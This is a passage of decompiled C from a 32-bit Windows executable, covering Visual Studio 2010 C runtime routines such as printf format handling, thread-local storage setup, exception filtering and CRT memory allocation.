                goto switchD_00408e09_caseD_0;
              }
            }
            else if (local_215 == 0x68) {
              local_214 = local_214 | 0x20;
            }
            else if (local_215 == 0x6c) {
              if (*pbVar13 == 0x6c) {
                local_214 = local_214 | 0x1000;
                local_240 = (byte *)_Format + 2;
              }
              else {
                local_214 = local_214 | 0x10;
              }
            }
            else if (local_215 == 0x77) {
              local_214 = local_214 | 0x800;
            }
            break;
          case 7:
            if ((char)local_215 < 'e') {
              if (local_215 == 100) {
LAB_004092f7:
                local_214 = local_214 | 0x40;
LAB_004092fe:
                local_224 = 10;
LAB_00409308:
                if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
                  local_22c = (wchar_t *)((int)_ArgList + 4);
                  if ((local_214 & 0x20) == 0) {
                    uVar4 = *(uint *)_ArgList;
                    if ((local_214 & 0x40) == 0) {
                      uVar10 = 0;
                    }
                    else {
                      uVar10 = (int)uVar4 >> 0x1f;
                    }
                  }
                  else {
                    if ((local_214 & 0x40) == 0) {
                      uVar4 = (uint)(ushort)*(wchar_t *)_ArgList;
                    }
                    else {
                      uVar4 = (uint)*(wchar_t *)_ArgList;
                    }
                    uVar10 = (int)uVar4 >> 0x1f;
                  }
                }
                else {
                  uVar4 = *(uint *)_ArgList;
                  uVar10 = *(uint *)((int)_ArgList + 4);
                  local_22c = (wchar_t *)((int)_ArgList + 8);
                }
                if ((((local_214 & 0x40) != 0) && ((int)uVar10 < 1)) && ((int)uVar10 < 0)) {
                  bVar14 = uVar4 != 0;
                  uVar4 = -uVar4;
                  uVar10 = -(uVar10 + bVar14);
                  local_214 = local_214 | 0x100;
                }
                uVar15 = CONCAT44(uVar10,uVar4);
                if ((local_214 & 0x9000) == 0) {
                  uVar10 = 0;
                }
                if (local_21c < 0) {
                  local_21c = 1;
                }
                else {
                  local_214 = local_214 & 0xfffffff7;
                  if (0x200 < local_21c) {
                    local_21c = 0x200;
                  }
                }
                if (uVar4 == 0 && uVar10 == 0) {
                  local_234 = 0;
                }
                pwVar12 = &local_11;
                while( true ) {
                  uVar4 = uVar10;
                  iVar8 = local_21c + -1;
                  if ((local_21c < 1) && ((uint)uVar15 == 0 && uVar4 == 0)) break;
                  local_21c = iVar8;
                  uVar15 = __aulldvrm((uint)uVar15,uVar4,local_224,(int)local_224 >> 0x1f);
                  iVar8 = extraout_ECX + 0x30;
                  if (0x39 < iVar8) {
                    iVar8 = iVar8 + local_24c;
                  }
                  *(char *)pwVar12 = (char)iVar8;
                  pwVar12 = (wchar_t *)((int)pwVar12 + -1);
                  uVar10 = (uint)((ulonglong)uVar15 >> 0x20);
                  local_268 = uVar4;
                }
                local_224 = (int)&local_11 + -(int)pwVar12;
                local_220 = (wchar_t *)((int)pwVar12 + 1);
                local_21c = iVar8;
                if (((local_214 & 0x200) != 0) && ((local_224 == 0 || (*(char *)local_220 != '0'))))
                {
                  *(char *)pwVar12 = '0';
                  local_224 = (int)&local_11 + -(int)pwVar12 + 1;
                  local_220 = pwVar12;
                }
              }
              else if ((char)local_215 < 'T') {
                if (local_215 == 0x53) {
                  if ((local_214 & 0x830) == 0) {
                    local_214 = local_214 | 0x800;
                  }
                  goto LAB_00409123;
                }
                if (local_215 == 0x41) {
LAB_004090a2:
                  local_215 = local_215 + 0x20;
                  local_270 = 1;
LAB_004090b5:
                  local_214 = local_214 | 0x40;
                  local_268 = 0x200;
                  pwVar12 = local_210;
                  uVar4 = local_268;
                  pwVar17 = local_210;
                  if (local_21c < 0) {
                    local_21c = 6;
                  }
                  else if (local_21c == 0) {
                    if (local_215 == 0x67) {
                      local_21c = 1;
                    }
                  }
                  else {
                    if (0x200 < local_21c) {
                      local_21c = 0x200;
                    }
                    if (0xa3 < local_21c) {
                      uVar4 = local_21c + 0x15d;
                      local_220 = local_210;
                      local_250 = (wchar_t *)__malloc_crt(uVar4);
                      pwVar12 = local_250;
                      pwVar17 = local_250;
                      if (local_250 == (wchar_t *)0x0) {
                        local_21c = 0xa3;
                        pwVar12 = local_210;
                        uVar4 = local_268;
                        pwVar17 = local_220;
                      }
                    }
                  }
                  local_220 = pwVar17;
                  local_268 = uVar4;
                  local_27c = *(undefined4 *)_ArgList;
                  local_22c = (wchar_t *)((int)_ArgList + 8);
                  local_278 = *(undefined4 *)((int)_ArgList + 4);
                  plVar19 = &local_260;
                  iVar5 = (int)(char)local_215;
                  puVar16 = &local_27c;
                  pwVar17 = pwVar12;
                  uVar4 = local_268;
                  iVar8 = local_21c;
                  uVar18 = local_270;
                  pcVar6 = (code *)DecodePointer(PTR_LAB_00419488);
                  (*pcVar6)(puVar16,pwVar17,uVar4,iVar5,iVar8,uVar18,plVar19);
                  uVar4 = local_214 & 0x80;
                  if ((uVar4 != 0) && (local_21c == 0)) {
                    plVar19 = &local_260;
                    pwVar17 = pwVar12;
                    pcVar6 = (code *)DecodePointer(PTR_LAB_00419494);
                    (*pcVar6)(pwVar17,plVar19);
                  }
                  if ((local_215 == 0x67) && (uVar4 == 0)) {
                    plVar19 = &local_260;
                    pwVar17 = pwVar12;
                    pcVar6 = (code *)DecodePointer(PTR_LAB_00419490);
                    (*pcVar6)(pwVar17,plVar19);
                  }
                  if ((char)*pwVar12 == '-') {
                    local_214 = local_214 | 0x100;
                    local_220 = (wchar_t *)((int)pwVar12 + 1);
                    pwVar12 = local_220;
                  }
LAB_00409255:
                  local_224 = _strlen((char *)pwVar12);
                }
                else if (local_215 == 0x43) {
                  if ((local_214 & 0x830) == 0) {
                    local_214 = local_214 | 0x800;
                  }
LAB_00409196:
                  local_22c = (wchar_t *)((int)_ArgList + 4);
                  if ((local_214 & 0x810) == 0) {
                    local_210[0]._0_1_ = (char)*(wchar_t *)_ArgList;
                    local_224 = 1;
                  }
                  else {
                    eVar7 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,*(wchar_t *)_ArgList
                                     );
                    if (eVar7 != 0) {
                      local_248 = 1;
                    }
                  }
                  local_220 = local_210;
                }
                else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_004090a2;
              }
              else {
                if (local_215 == 0x58) goto LAB_00409455;
                if (local_215 == 0x5a) {
                  psVar2 = *(short **)_ArgList;
                  local_22c = (wchar_t *)((int)_ArgList + 4);
                  pwVar12 = (wchar_t *)PTR_s__null__004191c0;
                  local_220 = (wchar_t *)PTR_s__null__004191c0;
                  if ((psVar2 == (short *)0x0) ||
                     (pwVar17 = *(wchar_t **)(psVar2 + 2), pwVar17 == (wchar_t *)0x0))
                  goto LAB_00409255;
                  local_224 = (size_t)*psVar2;
                  local_220 = pwVar17;
                  if ((local_214 & 0x800) == 0) {
                    local_23c = 0;
                  }
                  else {
                    local_224 = (int)local_224 / 2;
                    local_23c = 1;
                  }
                }
                else {
                  if (local_215 == 0x61) goto LAB_004090b5;
                  if (local_215 == 99) goto LAB_00409196;
                }
              }
LAB_0040962e:
              if (local_248 == 0) {
                if ((local_214 & 0x40) != 0) {
                  if ((local_214 & 0x100) == 0) {
                    if ((local_214 & 1) == 0) {
                      if ((local_214 & 2) == 0) goto LAB_00409677;
                      local_230 = 0x20;
                    }
                    else {
                      local_230 = 0x2b;
                    }
                  }
                  else {
                    local_230 = 0x2d;
                  }
                  local_234 = 1;
                }
LAB_00409677:
                uVar10 = (local_238 - local_224) - local_234;
                local_268 = uVar10;
                uVar4 = uVar10;
                if ((local_214 & 0xc) == 0) {
                  do {
                    if ((int)uVar4 < 1) break;
                    uVar4 = uVar4 - 1;
                    write_char();
                  } while (local_228 != -1);
                }
                write_string();
                if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
                  do {
                    if ((int)uVar10 < 1) break;
                    uVar10 = uVar10 - 1;
                    write_char();
                  } while (local_228 != -1);
                }
                if ((local_23c == 0) ||
                   (sVar11 = local_224, pwVar12 = local_220, (int)local_224 < 1)) {
                  write_string();
                }
                else {
                  do {
                    sVar11 = sVar11 - 1;
                    eVar7 = _wctomb_s(&local_274,(char *)((int)&local_11 + 1),6,*pwVar12);
                    if ((eVar7 != 0) || (local_274 == 0)) {
                      local_228 = -1;
                      break;
                    }
                    write_string();
                    pwVar12 = pwVar12 + 1;
                  } while (sVar11 != 0);
                }
                if ((-1 < local_228) && (uVar4 = local_268, (local_214 & 4) != 0)) {
                  do {
                    if ((int)uVar4 < 1) break;
                    write_char();
                    uVar4 = uVar4 - 1;
                  } while (local_228 != -1);
                }
              }
            }
            else {
              if ('p' < (char)local_215) {
                if (local_215 == 0x73) {
LAB_00409123:
                  iVar8 = local_21c;
                  if (local_21c == -1) {
                    iVar8 = 0x7fffffff;
                  }
                  local_22c = (wchar_t *)((int)_ArgList + 4);
                  local_220 = *(wchar_t **)_ArgList;
                  if ((local_214 & 0x810) == 0) {
                    pwVar12 = local_220;
                    if (local_220 == (wchar_t *)0x0) {
                      pwVar12 = (wchar_t *)PTR_s__null__004191c0;
                      local_220 = (wchar_t *)PTR_s__null__004191c0;
                    }
                    for (; (iVar8 != 0 && (iVar8 = iVar8 + -1, (char)*pwVar12 != '\0'));
                        pwVar12 = (wchar_t *)((int)pwVar12 + 1)) {
                    }
                    local_224 = (int)pwVar12 - (int)local_220;
                  }
                  else {
                    if (local_220 == (wchar_t *)0x0) {
                      local_220 = (wchar_t *)PTR_u__null__004191c4;
                    }
                    local_23c = 1;
                    for (pwVar12 = local_220;
                        (iVar8 != 0 && (iVar8 = iVar8 + -1, *pwVar12 != L'\0'));
                        pwVar12 = pwVar12 + 1) {
                    }
                    local_224 = (int)pwVar12 - (int)local_220 >> 1;
                  }
                  goto LAB_0040962e;
                }
                if (local_215 == 0x75) goto LAB_004092fe;
                if (local_215 != 0x78) goto LAB_0040962e;
                local_24c = 0x27;
LAB_00409481:
                local_224 = 0x10;
                if ((local_214 & 0x80) != 0) {
                  local_22f = (char)local_24c + 'Q';
                  local_230 = 0x30;
                  local_234 = 2;
                }
                goto LAB_00409308;
              }
              if (local_215 == 0x70) {
                local_21c = 8;
LAB_00409455:
                local_24c = 7;
                goto LAB_00409481;
              }
              if ((char)local_215 < 'e') goto LAB_0040962e;
              if ((char)local_215 < 'h') goto LAB_004090b5;
              if (local_215 == 0x69) goto LAB_004092f7;
              if (local_215 != 0x6e) {
                if (local_215 != 0x6f) goto LAB_0040962e;
                local_224 = 8;
                if ((local_214 & 0x80) != 0) {
                  local_214 = local_214 | 0x200;
                }
                goto LAB_00409308;
              }
              piVar3 = *(int **)_ArgList;
              local_22c = (wchar_t *)((int)_ArgList + 4);
              iVar8 = __get_printf_count_output();
              if (iVar8 == 0) goto LAB_00408d05;
              if ((local_214 & 0x20) == 0) {
                *piVar3 = local_228;
              }
              else {
                *(undefined2 *)piVar3 = (undefined2)local_228;
              }
              local_248 = 1;
            }
            if (local_250 != (wchar_t *)0x0) {
              _free(local_250);
              local_250 = (wchar_t *)0x0;
            }
          }
          local_215 = *local_240;
          iVar8 = local_264;
          _Format = (char *)local_240;
          _ArgList = (va_list)local_22c;
        }
        if (local_254 != '\0') {
          *(uint *)(local_258 + 0x70) = *(uint *)(local_258 + 0x70) & 0xfffffffd;
        }
        goto LAB_00409814;
      }
    }
  }
LAB_00408d05:
  piVar3 = __errno();
  *piVar3 = 0x16;
  FUN_004087f3();
  if (local_254 != '\0') {
    *(uint *)(local_258 + 0x70) = *(uint *)(local_258 + 0x70) & 0xfffffffd;
  }
LAB_00409814:
  iVar8 = __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



/* Function: FUN_00409846 */

void FUN_00409846(void)

{
  EncodePointer((PVOID)0x0);
  return;
}



/* Function: ___fls_getvalue@4 */

/* Library Function - Single Match
    ___fls_getvalue@4
   
   Library: Visual Studio 2010 Release */

void ___fls_getvalue_4(undefined4 param_1)

{
  code *pcVar1;
  
  pcVar1 = (code *)TlsGetValue(DAT_004191cc);
  (*pcVar1)(param_1);
  return;
}



/* Function: FUN_00409872 */

undefined4 FUN_00409872(void)

{
  return DAT_004191c8;
}



/* Function: ___set_flsgetvalue */

/* Library Function - Single Match
    ___set_flsgetvalue
   
   Library: Visual Studio 2010 Release */

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_004191cc);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = DecodePointer(DAT_0041b53c);
    TlsSetValue(DAT_004191cc,lpTlsValue);
  }
  return lpTlsValue;
}



/* Function: ___fls_setvalue@8 */

/* Library Function - Single Match
    ___fls_setvalue@8
   
   Library: Visual Studio 2010 Release */

void ___fls_setvalue_8(undefined4 param_1,undefined4 param_2)

{
  code *pcVar1;
  
  pcVar1 = (code *)DecodePointer(DAT_0041b540);
  (*pcVar1)(param_1,param_2);
  return;
}



/* Function: __mtterm */

/* Library Function - Single Match
    __mtterm
   
   Library: Visual Studio 2010 Release */

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_004191c8 != -1) {
    iVar2 = DAT_004191c8;
    pcVar1 = (code *)DecodePointer(DAT_0041b544);
    (*pcVar1)(iVar2);
    DAT_004191c8 = -1;
  }
  if (DAT_004191cc != 0xffffffff) {
    TlsFree(DAT_004191cc);
    DAT_004191cc = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



/* Function: __initptd */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __initptd
   
   Library: Visual Studio 2010 Release */

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  GetModuleHandleW(L"KERNEL32.DLL");
  _Ptd->_pxcptacttab = &DAT_00415f00;
  _Ptd->_terrno = 0;
  _Ptd->_holdrand = 1;
  _Ptd->_ownlocale = 1;
  *(undefined1 *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined1 *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_00419720;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_004099a8();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_00419e88;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_004099b1();
  return;
}



/* Function: FUN_004099a8 */

void FUN_004099a8(void)

{
  FUN_0040c0a7(0xd);
  return;
}



/* Function: FUN_004099b1 */

void FUN_004099b1(void)

{
  FUN_0040c0a7(0xc);
  return;
}



/* Function: __getptd_noexit */

/* Library Function - Single Match
    __getptd_noexit
   
   Library: Visual Studio 2010 Release */

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_004191c8;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_004191c8;
      p_Var5 = _Ptd;
      pcVar1 = (code *)DecodePointer(DAT_0041b540);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



/* Function: __getptd */

/* Library Function - Single Match
    __getptd
   
   Library: Visual Studio 2010 Release */

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



/* Function: __freefls@4 */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __freefls@4
   
   Library: Visual Studio 2010 Release */

void __freefls_4(void *param_1)

{
  LONG *pLVar1;
  LONG LVar2;
  
  if (param_1 != (void *)0x0) {
    if (*(void **)((int)param_1 + 0x24) != (void *)0x0) {
      _free(*(void **)((int)param_1 + 0x24));
    }
    if (*(void **)((int)param_1 + 0x2c) != (void *)0x0) {
      _free(*(void **)((int)param_1 + 0x2c));
    }
    if (*(void **)((int)param_1 + 0x34) != (void *)0x0) {
      _free(*(void **)((int)param_1 + 0x34));
    }
    if (*(void **)((int)param_1 + 0x3c) != (void *)0x0) {
      _free(*(void **)((int)param_1 + 0x3c));
    }
    if (*(void **)((int)param_1 + 0x40) != (void *)0x0) {
      _free(*(void **)((int)param_1 + 0x40));
    }
    if (*(void **)((int)param_1 + 0x44) != (void *)0x0) {
      _free(*(void **)((int)param_1 + 0x44));
    }
    if (*(void **)((int)param_1 + 0x48) != (void *)0x0) {
      _free(*(void **)((int)param_1 + 0x48));
    }
    if (*(undefined **)((int)param_1 + 0x5c) != &DAT_00415f00) {
      _free(*(undefined **)((int)param_1 + 0x5c));
    }
    __lock(0xd);
    pLVar1 = *(LONG **)((int)param_1 + 0x68);
    if (pLVar1 != (LONG *)0x0) {
      LVar2 = InterlockedDecrement(pLVar1);
      if ((LVar2 == 0) && (pLVar1 != (LONG *)&DAT_00419720)) {
        _free(pLVar1);
      }
    }
    FUN_00409b67();
    __lock(0xc);
    pLVar1 = *(LONG **)((int)param_1 + 0x6c);
    if (pLVar1 != (LONG *)0x0) {
      ___removelocaleref(pLVar1);
      if (((pLVar1 != (LONG *)PTR_DAT_00419e88) && (pLVar1 != (LONG *)&DAT_00419db0)) &&
         (*pLVar1 == 0)) {
        ___freetlocinfo(pLVar1);
      }
    }
    FUN_00409b73();
    _free(param_1);
  }
  return;
}



/* Function: FUN_00409b67 */

void FUN_00409b67(void)

{
  FUN_0040c0a7(0xd);
  return;
}



/* Function: FUN_00409b73 */

void FUN_00409b73(void)

{
  FUN_0040c0a7(0xc);
  return;
}



/* Function: __freeptd */

/* Library Function - Single Match
    __freeptd
   
   Library: Visual Studio 2010 Release */

void __cdecl __freeptd(_ptiddata _Ptd)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  undefined4 uVar4;
  
  if (DAT_004191c8 != -1) {
    if ((_Ptd == (_ptiddata)0x0) && (pvVar1 = TlsGetValue(DAT_004191cc), pvVar1 != (LPVOID)0x0)) {
      iVar3 = DAT_004191c8;
      pcVar2 = (code *)TlsGetValue(DAT_004191cc);
      _Ptd = (_ptiddata)(*pcVar2)(iVar3);
    }
    uVar4 = 0;
    iVar3 = DAT_004191c8;
    pcVar2 = (code *)DecodePointer(DAT_0041b540);
    (*pcVar2)(iVar3,uVar4);
    __freefls_4(_Ptd);
  }
  if (DAT_004191cc != 0xffffffff) {
    TlsSetValue(DAT_004191cc,(LPVOID)0x0);
  }
  return;
}



/* Function: __mtinit */

/* Library Function - Single Match
    __mtinit
   
   Library: Visual Studio 2010 Release */

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  code *pcVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    __mtterm();
    return 0;
  }
  DAT_0041b538 = GetProcAddress(hModule,"FlsAlloc");
  DAT_0041b53c = GetProcAddress(hModule,"FlsGetValue");
  DAT_0041b540 = GetProcAddress(hModule,"FlsSetValue");
  DAT_0041b544 = GetProcAddress(hModule,"FlsFree");
  if ((((DAT_0041b538 == (FARPROC)0x0) || (DAT_0041b53c == (FARPROC)0x0)) ||
      (DAT_0041b540 == (FARPROC)0x0)) || (DAT_0041b544 == (FARPROC)0x0)) {
    DAT_0041b53c = TlsGetValue_exref;
    DAT_0041b538 = (FARPROC)&LAB_0040984f;
    DAT_0041b540 = TlsSetValue_exref;
    DAT_0041b544 = TlsFree_exref;
  }
  DAT_004191cc = TlsAlloc();
  if ((DAT_004191cc != 0xffffffff) && (BVar1 = TlsSetValue(DAT_004191cc,DAT_0041b53c), BVar1 != 0))
  {
    __init_pointers();
    DAT_0041b538 = (FARPROC)EncodePointer(DAT_0041b538);
    DAT_0041b53c = (FARPROC)EncodePointer(DAT_0041b53c);
    DAT_0041b540 = (FARPROC)EncodePointer(DAT_0041b540);
    DAT_0041b544 = (FARPROC)EncodePointer(DAT_0041b544);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      pcVar5 = __freefls_4;
      pcVar3 = (code *)DecodePointer(DAT_0041b538);
      DAT_004191c8 = (*pcVar3)(pcVar5);
      if ((DAT_004191c8 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_004191c8;
        p_Var6 = _Ptd;
        pcVar3 = (code *)DecodePointer(DAT_0041b540);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
    __mtterm();
  }
  return 0;
}



/* Function: __XcptFilter */

/* Library Function - Single Match
    __XcptFilter
   
   Library: Visual Studio 2010 Release */

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + 0x24);
    if ((puVar1 + 0x24 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          iVar7 = 0x24;
          do {
            *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
            iVar7 = iVar7 + 0xc;
          } while (iVar7 < 0x90);
          uVar4 = *puVar6;
          iVar7 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          else if (uVar4 == 0xc00002b5) {
            p_Var5->_tfpecode = 0x8d;
          }
          else if (uVar4 == 0xc00002b4) {
            p_Var5->_tfpecode = 0x8e;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar7;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



/* Function: __SEH_prolog4 */

/* WARNING: This is an inlined function */
/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Variable defined which should be unmapped: param_2 */
/* Library Function - Single Match
    __SEH_prolog4
   
   Library: Visual Studio */

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined1 local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_004191b4 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



/* Function: __SEH_epilog4 */

/* WARNING: This is an inlined function */
/* Library Function - Single Match
    __SEH_epilog4
   
   Library: Visual Studio */

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



/* Function: __except_handler4 */

/* Library Function - Single Match
    __except_handler4
   
   Library: Visual Studio 2010 Release */

undefined4 __cdecl __except_handler4(PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  PEXCEPTION_RECORD local_1c;
  undefined4 local_18;
  uint *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_004191b4);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    __security_check_cookie(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  __security_check_cookie(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((param_1->ExceptionFlags & 0x66) == 0) {
    *(PEXCEPTION_RECORD **)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (uint *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = (PVOID)*local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = _EH4_CallFilterFunc((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_00409fb8;
        }
        if (0 < iVar2) {
          if (((param_1->ExceptionCode == 0xe06d7363) &&
              (PTR____DestructExceptionObject_00417780 != (undefined *)0x0)) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_00417780)
             , BVar3 != 0)) {
            (*(code *)PTR____DestructExceptionObject_00417780)(param_1,1);
          }
          _EH4_GlobalUnwind2(param_2,param_1);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            _EH4_LocalUnwind((int)param_2,(uint)pvVar4,iVar1,&DAT_004191b4);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            __security_check_cookie(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          __security_check_cookie(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          _EH4_TransferToHandler((undefined *)local_14[2]);
          goto LAB_0040a07f;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_0040a07f:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    _EH4_LocalUnwind((int)pvVar4,0xfffffffe,iVar1,&DAT_004191b4);
  }
LAB_00409fb8:
  if (*piVar5 != -2) {
    __security_check_cookie(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  __security_check_cookie(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



/* Function: __malloc_crt */

/* Library Function - Single Match
    __malloc_crt
   
   Library: Visual Studio 2010 Release */

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_0041b548 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0041b548 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



/* Function: __calloc_crt */

/* Library Function - Single Match
    __calloc_crt
   
   Library: Visual Studio 2010 Release */

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (DAT_0041b548 == 0) break;
    Sleep(dwMilliseconds);
